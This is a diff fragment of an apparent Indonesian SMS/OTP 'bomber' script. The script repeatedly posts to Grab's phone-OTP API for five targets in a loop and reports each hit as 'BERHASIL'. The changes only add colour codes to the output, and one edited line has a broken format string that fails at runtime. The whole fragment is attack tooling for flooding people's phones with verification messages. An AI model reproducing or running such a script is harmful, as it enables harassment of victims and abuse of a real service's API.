@@ -57,25 +57,25 @@ try:
 		r4 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt4)
 		r5 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt5)
 		if str(idk) in str(r1.text):
-			print("[+] TARGET1 BERHASIL")
+			print("%s[+] TARGET1 BERHASIL"%(g))
 		else:
 			print("%s[-] TARGET1 GAGAL"%(o))
 		if str(idk) in str(r2.text):
-			print("[+] TARGET2 BERHASIL")
+			print("%s[+] TARGET2 BERHASIL"%(g))
 		else:
-			print("[-] TARGET2 GAGAL")
+			print("%s[-] TARGET2 GAGAL"%(o))
 		if str(idk) in str(r3.text):
-			print("[+] TARGET3 BERHASIL")
+			print("%s[+] TARGET3 BERHASIL"%(g))
 		else:
-			print("[-] TARGET3 GAGAL")
+			print("%s[-] TARGET3 GAGAL"%(o))
 		if str(idk) in str(r4.text):
-			print("[+] TARGET4 BERHASIL")
+			print("%s[+] TARGET4 BERHASIL"%(g))
 		else:
-			print("[-] TARGET4 GAGAL")
+			print("[-] TARGET4 GAGAL"%(o))
 		if str(idk) in str(r5.text):
-			print("[+] TARGET5 BERHASIL")
+			print("%s[+] TARGET5 BERHASIL"%(g))
 		else:
-			print("[-] TARGET5 GAGAL")
+			print("%s[-] TARGET5 GAGAL"%(o))
 		print("="*30)
 		time.sleep(1)
 except KeyboardInterrupt:
